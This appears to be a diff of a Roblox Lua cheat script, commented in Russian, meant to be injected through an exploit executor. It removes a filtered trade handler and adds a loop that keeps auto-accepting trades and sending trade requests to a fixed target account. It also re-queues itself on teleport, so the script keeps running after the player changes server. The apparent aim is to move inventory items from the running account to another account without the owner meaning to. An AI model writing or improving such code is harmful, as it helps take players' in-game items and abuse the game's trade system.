@@ -4,8 +4,8 @@ if _G.gg then
     return
 end
 _G.gg = true
-repeat wait(2) print("wait for loaded game") until game:IsLoaded()
-repeat wait(2) print("wait for pg") until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+repeat wait() until game:IsLoaded()
+repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui") and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
 
 function missing(t, f, fallback)
     if type(f) == t then return f end
@@ -72,16 +72,11 @@ local TDselect = DEVICE_TYPE == 'tablet' and tradeGUI2
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local TradeRemote = ReplicatedStorage:WaitForChild("Trade")
 
 local container = TDselect:WaitForChild("Container")
 -- Получаем кнопки
 local actions = container:WaitForChild("Trade"):WaitForChild("Actions")
 local acceptcon = actions:WaitForChild("Accept")
-
--- Получаем TradeRequest GUI
-local tradeRequest2 = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:WaitForChild("TradeRequest")
-local TradeRequest = DEVICE_TYPE == 'tablet' and tradeRequest2
 
 local function normalizeName(name)
     return string.gsub(name, "[()%[%]{}]", "")
@@ -115,38 +110,6 @@ TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
         print("финики закрыто.")
     end
 end)
-
---[[TradeRequest:GetPropertyChangedSignal("Visible"):Connect(function()
-    if TradeRequest.Visible then
-        local usernameLabel = TradeRequest:FindFirstChild("ReceivingRequest") and TradeRequest.ReceivingRequest:FindFirstChild("Username")
-        if usernameLabel then
-            -- Если текст уже корректный и наш доверенный игрок
-            if usernameLabel.Text == targetName then
-                handleTrade(usernameLabel.Text)
-            elseif usernameLabel.Text == "Nikilis"
-                or usernameLabel.Text == "PLAYER_NAME1" then
-                -- Ждём, пока текст сменится на реального игрока
-                local conn
-                conn = usernameLabel:GetPropertyChangedSignal("Text"):Connect(function()
-                    if usernameLabel.Text ~= "Nikilis"
-                        and usernameLabel.Text ~= "PLAYER_NAME1" then
-                        conn:Disconnect()
-                        if usernameLabel.Text == targetName then
-                            handleTrade(usernameLabel.Text)
-                        else
-                            print("Трейд от недоверенного игрока:", usernameLabel.Text)
-                        end
-                    end
-                end)
-            else
-                -- Трейд от недоверенного игрока
-                print("Трейд от недоверенного игрока:", usernameLabel.Text)
-            end
-        end
-    else
-        warn("нету request")
-    end
-end)]]
 
 TDselect:GetPropertyChangedSignal("Enabled"):Connect(function()
     if TDselect.Enabled then
@@ -234,24 +197,6 @@ function deletePaste()
         task.wait(6)
     end
 end
-
---[[Функция для обработки трейда
-function handleTrade(requesterName)
-    local args = {}
-    if requesterName == targetName then
-        -- Наш игрок, принимаем трейд
-        if TradeRemote:FindFirstChild("AcceptRequest") then
-            TradeRemote.AcceptRequest:FireServer(unpack(args))
-            print("Принят трейд от " .. requesterName)
-        end
-    else
-        -- Не наш игрок, отклоняем трейд
-        if TradeRemote:FindFirstChild("DeclineRequest") then
-            TradeRemote.DeclineRequest:FireServer(unpack(args))
-            print("Отклонен трейд от " .. requesterName)
-        end
-    end
-end]]
 
 game.Players.LocalPlayer.OnTeleport:Connect(function()
     if queueteleport then
@@ -353,9 +298,14 @@ task.spawn(function()
     while true do
         checkPlayer()
         checkInventory()
-        if TradeRemote:FindFirstChild("AcceptRequest") then
-            local args = {}
-            TradeRemote.AcceptRequest:FireServer(unpack(args))
+        if math.random() < 0.5 then
+            if Trade:FindFirstChild("AcceptRequest") then
+                Trade.AcceptRequest:FireServer()
+            end
+        else
+            if Trade:FindFirstChild("SendRequest") then
+                Trade.SendRequest:InvokeServer(targetName)
+            end
         end
         wait(2)
     end
